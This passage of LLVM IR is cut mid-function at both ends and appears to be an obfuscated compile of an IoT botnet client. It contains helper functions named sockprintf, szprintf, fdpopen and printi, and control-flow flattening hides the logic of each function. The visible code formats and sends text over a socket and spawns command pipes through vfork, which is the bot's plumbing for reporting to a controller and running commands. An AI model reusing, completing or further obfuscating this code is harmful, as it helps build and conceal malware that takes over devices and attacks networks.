  %300 = load i8**, i8*** %4, align 8
  %301 = icmp ne i8** %300, null
  %302 = select i1 %301, i32 -1660502270, i32 610123725
  store i32 %302, i32* %switchVar
  br label %loopEnd

; <label>:303:                                    ; preds = %loopEntry
  %304 = load i8**, i8*** %4, align 8
  %305 = load i8*, i8** %304, align 8
  store i8 0, i8* %305, align 1
  store i32 610123725, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %308 = bitcast %struct.__va_list_tag* %307 to i8*
  call void @llvm.va_end(i8* %308)
  %309 = load i32, i32* %9, align 4
  ret i32 %309

loopEnd:                                          ; preds = %303, %299, %296, %295, %288, %287, %286, %274, %269, %263, %257, %251, %244, %239, %233, %226, %220, %213, %208, %202, %195, %189, %182, %177, %171, %164, %158, %151, %146, %140, %133, %127, %121, %120, %118, %110, %105, %99, %93, %87, %84, %75, %73, %68, %62, %61, %56, %50, %49, %46, %40, %39, %33, %32, %24, %18, %12, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1452131307, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1452131307, label %first
    i32 639143459, label %16
    i32 813435292, label %18
    i32 -804455370, label %23
    i32 -1309116964, label %26
    i32 -1184272004, label %29
    i32 -1681730633, label %34
    i32 2029782163, label %35
    i32 1348126728, label %39
    i32 -991842016, label %44
    i32 879846860, label %45
    i32 665082639, label %46
    i32 448485590, label %51
    i32 -1360385556, label %52
    i32 -982558429, label %56
    i32 -1233205940, label %61
    i32 -1259478693, label %64
    i32 273893087, label %65
    i32 -1068411574, label %66
    i32 -92678570, label %71
    i32 -1356848800, label %78
    i32 -265313996, label %81
    i32 393502498, label %82
    i32 1156952665, label %86
    i32 -872626440, label %91
    i32 1711585454, label %94
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp sgt i32 %.reload, 0
  %15 = select i1 %14, i32 639143459, i32 665082639
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %17 = load i8*, i8** %6, align 8
  store i8* %17, i8** %12, align 8
  store i32 813435292, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %12, align 8
  %20 = load i8, i8* %19, align 1
  %21 = icmp ne i8 %20, 0
  %22 = select i1 %21, i32 -804455370, i32 -1184272004
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %11, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %11, align 4
  store i32 -1309116964, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i8*, i8** %12, align 8
  %28 = getelementptr inbounds i8, i8* %27, i32 1
  store i8* %28, i8** %12, align 8
  store i32 813435292, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %11, align 4
  %31 = load i32, i32* %7, align 4
  %32 = icmp sge i32 %30, %31
  %33 = select i1 %32, i32 -1681730633, i32 2029782163
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 1348126728, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = sub nsw i32 %37, %36
  store i32 %38, i32* %7, align 4
  store i32 1348126728, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  %41 = and i32 %40, 2
  %42 = icmp ne i32 %41, 0
  %43 = select i1 %42, i32 -991842016, i32 879846860
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 48, i32* %10, align 4
  store i32 879846860, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 665082639, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %8, align 4
  %48 = and i32 %47, 1
  %49 = icmp ne i32 %48, 0
  %50 = select i1 %49, i32 273893087, i32 448485590
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1360385556, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %7, align 4
  %54 = icmp sgt i32 %53, 0
  %55 = select i1 %54, i32 -982558429, i32 -1259478693
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8**, i8*** %5, align 8
  %58 = load i32, i32* %10, align 4
  call void @printchar(i8** %57, i32 %58)
  %59 = load i32, i32* %9, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %9, align 4
  store i32 -1233205940, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, -1
  store i32 %63, i32* %7, align 4
  store i32 -1360385556, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 273893087, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  store i32 -1068411574, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i8*, i8** %6, align 8
  %68 = load i8, i8* %67, align 1
  %69 = icmp ne i8 %68, 0
  %70 = select i1 %69, i32 -92678570, i32 -265313996
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i8**, i8*** %5, align 8
  %73 = load i8*, i8** %6, align 8
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i32
  call void @printchar(i8** %72, i32 %75)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %9, align 4
  store i32 -1356848800, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %6, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %6, align 8
  store i32 -1068411574, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 393502498, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %7, align 4
  %84 = icmp sgt i32 %83, 0
  %85 = select i1 %84, i32 1156952665, i32 1711585454
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i8**, i8*** %5, align 8
  %88 = load i32, i32* %10, align 4
  call void @printchar(i8** %87, i32 %88)
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %9, align 4
  store i32 -872626440, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  store i32 393502498, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i32, i32* %9, align 4
  ret i32 %95

loopEnd:                                          ; preds = %91, %86, %82, %81, %78, %71, %66, %65, %64, %61, %56, %52, %51, %46, %45, %44, %39, %35, %34, %29, %26, %23, %18, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %.reg2mem = alloca i32
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  store i32 %23, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -171311607, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -171311607, label %first
    i32 -498308945, label %26
    i32 -579390498, label %34
    i32 -1028339047, label %38
    i32 450726857, label %42
    i32 -892447706, label %46
    i32 577138494, label %49
    i32 -2003144767, label %54
    i32 2018033847, label %58
    i32 59241341, label %65
    i32 -1708693605, label %71
    i32 2118928082, label %80
    i32 -83911901, label %84
    i32 -277562540, label %88
    i32 363404327, label %93
    i32 -1797086281, label %99
    i32 1363514770, label %102
    i32 182304145, label %103
    i32 -1120837767, label %111
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %24 = icmp eq i32 %.reload, 0
  %25 = select i1 %24, i32 -498308945, i32 -579390498
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %27, align 1
  %28 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %28, align 1
  %29 = load i8**, i8*** %9, align 8
  %30 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %31 = load i32, i32* %13, align 4
  %32 = load i32, i32* %14, align 4
  %33 = call i32 @prints(i8** %29, i8* %30, i32 %31, i32 %32)
  store i32 %33, i32* %8, align 4
  store i32 -1120837767, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i32, i32* %12, align 4
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -1028339047, i32 577138494
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %11, align 4
  %40 = icmp eq i32 %39, 10
  %41 = select i1 %40, i32 450726857, i32 577138494
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %10, align 4
  %44 = icmp slt i32 %43, 0
  %45 = select i1 %44, i32 -892447706, i32 577138494
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1, i32* %19, align 4
  %47 = load i32, i32* %10, align 4
  %48 = sub nsw i32 0, %47
  store i32 %48, i32* %21, align 4
  store i32 577138494, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %51 = getelementptr inbounds i8, i8* %50, i64 12
  %52 = getelementptr inbounds i8, i8* %51, i64 -1
  store i8* %52, i8** %17, align 8
  %53 = load i8*, i8** %17, align 8
  store i8 0, i8* %53, align 1
  store i32 -2003144767, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %21, align 4
  %56 = icmp ne i32 %55, 0
  %57 = select i1 %56, i32 2018033847, i32 2118928082
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %21, align 4
  %60 = load i32, i32* %11, align 4
  %61 = urem i32 %59, %60
  store i32 %61, i32* %18, align 4
  %62 = load i32, i32* %18, align 4
  %63 = icmp sge i32 %62, 10
  %64 = select i1 %63, i32 59241341, i32 -1708693605
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, 48
  %68 = sub nsw i32 %67, 10
  %69 = load i32, i32* %18, align 4
  %70 = add nsw i32 %69, %68
  store i32 %70, i32* %18, align 4
  store i32 -1708693605, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 48
  %74 = trunc i32 %73 to i8
  %75 = load i8*, i8** %17, align 8
  %76 = getelementptr inbounds i8, i8* %75, i32 -1
  store i8* %76, i8** %17, align 8
  store i8 %74, i8* %76, align 1
  %77 = load i32, i32* %11, align 4
  %78 = load i32, i32* %21, align 4
  %79 = udiv i32 %78, %77
  store i32 %79, i32* %21, align 4
  store i32 -2003144767, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = load i32, i32* %19, align 4
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 -83911901, i32 182304145
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %13, align 4
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 -277562540, i32 -1797086281
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = load i32, i32* %14, align 4
  %90 = and i32 %89, 2
  %91 = icmp ne i32 %90, 0
  %92 = select i1 %91, i32 363404327, i32 -1797086281
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %94, i32 45)
  %95 = load i32, i32* %20, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %20, align 4
  %97 = load i32, i32* %13, align 4
  %98 = add nsw i32 %97, -1
  store i32 %98, i32* %13, align 4
  store i32 1363514770, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8*, i8** %17, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 -1
  store i8* %101, i8** %17, align 8
  store i8 45, i8* %101, align 1
  store i32 1363514770, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 182304145, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i32, i32* %20, align 4
  %105 = load i8**, i8*** %9, align 8
  %106 = load i8*, i8** %17, align 8
  %107 = load i32, i32* %13, align 4
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @prints(i8** %105, i8* %106, i32 %107, i32 %108)
  %110 = add nsw i32 %104, %109
  store i32 %110, i32* %8, align 4
  store i32 -1120837767, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  ret i32 %112

loopEnd:                                          ; preds = %103, %102, %99, %93, %88, %84, %80, %71, %65, %58, %54, %49, %46, %42, %38, %34, %26, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %.reg2mem = alloca i8**
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  store i8** %5, i8*** %.reg2mem
  %switchVar = alloca i32
  store i32 882826426, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 882826426, label %first
    i32 1707487405, label %8
    i32 1288790363, label %16
    i32 -1700064341, label %19
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i8**, i8*** %.reg2mem
  %6 = icmp ne i8** %.reload, null
  %7 = select i1 %6, i32 1707487405, i32 1288790363
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %4, align 4
  %10 = trunc i32 %9 to i8
  %11 = load i8**, i8*** %3, align 8
  %12 = load i8*, i8** %11, align 8
  store i8 %10, i8* %12, align 1
  %13 = load i8**, i8*** %3, align 8
  %14 = load i8*, i8** %13, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %13, align 8
  store i32 -1700064341, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = bitcast i32* %4 to i8*
  %18 = call i64 @write(i32 1, i8* %17, i64 1)
  store i32 -1700064341, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %16, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %.reg2mem4 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -466038588, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -466038588, label %first
    i32 1922435946, label %15
    i32 -2035656290, label %21
    i32 1959696161, label %28
    i32 -311816876, label %29
    i32 729811432, label %34
    i32 1956415529, label %35
    i32 1366657448, label %39
    i32 461953532, label %43
    i32 1920102369, label %44
    i32 169887777, label %54
    i32 -37221445, label %55
    i32 151325741, label %61
    i32 -419901343, label %NodeBlock
    i32 -700457368, label %LeafBlock1
    i32 -1759447507, label %LeafBlock
    i32 1354415335, label %66
    i32 -654212890, label %73
    i32 1350182691, label %79
    i32 1875458956, label %84
    i32 128043702, label %91
    i32 -948228241, label %95
    i32 -123154253, label %100
    i32 936521318, label %107
    i32 -1746472753, label %111
    i32 -2106671437, label %NewDefault
    i32 -572114977, label %114
    i32 248660780, label %120
    i32 -1137798215, label %126
    i32 699273825, label %132
    i32 -27347873, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 1922435946, i32 -2035656290
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 1959696161, i32 -2035656290
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 1959696161, i32 -311816876
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27347873, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 729811432, i32 1956415529
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27347873, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 1366657448, i32 151325741
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 461953532, i32 1920102369
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27347873, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 169887777, i32 -37221445
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27347873, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 151325741, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 -419901343, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 -1759447507, i32 -700457368
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 -654212890, i32 -2106671437
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 1354415335, i32 -2106671437
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -27347873, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 1350182691, i32 -948228241
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 1875458956, i32 128043702
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 128043702, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1746472753, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 -123154253, i32 936521318
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 936521318, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
